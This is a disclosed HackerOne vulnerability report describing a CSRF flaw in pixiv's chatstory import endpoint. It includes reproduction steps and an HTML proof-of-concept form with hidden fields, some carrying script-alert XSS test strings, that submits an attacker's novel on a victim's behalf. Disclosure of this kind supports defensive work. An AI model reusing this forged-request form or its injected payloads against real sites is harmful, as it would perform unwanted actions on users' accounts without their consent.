# CSRF at https://chatstory.pixiv.net/imported

## Report Details
- **Report ID**: 534908
- **URL**: https://hackerone.com/reports/534908
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-04-11T04:33:59.006Z
- **Disclosed**: 2020-07-02T09:46:56.099Z

## Reporter
- **Username**: katsuragicsl
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: pixiv

## Vulnerability Information
## Summary:

A CSRF in `https://chatstory.pixiv.net/imported` can trick users to import a novel of the attacker as the users' chatstory.

## Steps To Reproduce:

  1. Attacker creates a novel
  2. Go to the novel (https://www.pixiv.net/novel/show.php?id=10997105) Import the novel as chatstory by clicking the "チャットストーリーを作る" on the sidebar. You show notice that the actual request to create a chatstory is a POST request to `https://chatstory.pixiv.net/imported` with body

`id=<novel_id>&text=<something>&comment=<something>&title=<something>&user_id=<attacker_id>&x_restrict=0&is_original=true`

  3. Use the above information to create a http post form. The <attacker_id> doesn't matter. 

## Supporting Material/References:

Please see the following "living" PoC:

`<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://chatstory.pixiv.net/imported" method="POST">
      <input type="hidden" name="id" value="10997105" />
      <input type="hidden" name="text" value="test&lt;script&gt;alert&#40;1&#41;&lt;&#47;script&gt;&#13;&#10;&#13;&#10;&#13;&#10;Title&#13;&#10;&#13;&#10;Normal&#13;&#10;&#13;&#10;Jump&#13;&#10;&#13;&#10;&#13;&#10;" />
      <input type="hidden" name="comment" value="test&amp;lt&#59;script&amp;gt&#59;alert&#40;1&#41;&amp;lt&#59;&#47;script&amp;gt&#59;" />
      <input type="hidden" name="tags" value="&#35;test" />
      <input type="hidden" name="title" value="test&lt;script&gt;alert&#40;1&#41;&lt;&#47;script&gt;" />
      <input type="hidden" name="user&#95;id" value="39570048" />
      <input type="hidden" name="x&#95;restrict" value="0" />
      <input type="hidden" name="is&#95;original" value="true" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
`

## Impact

Trick users to import novel of attacker as a chatstory

## Attachments
No attachments
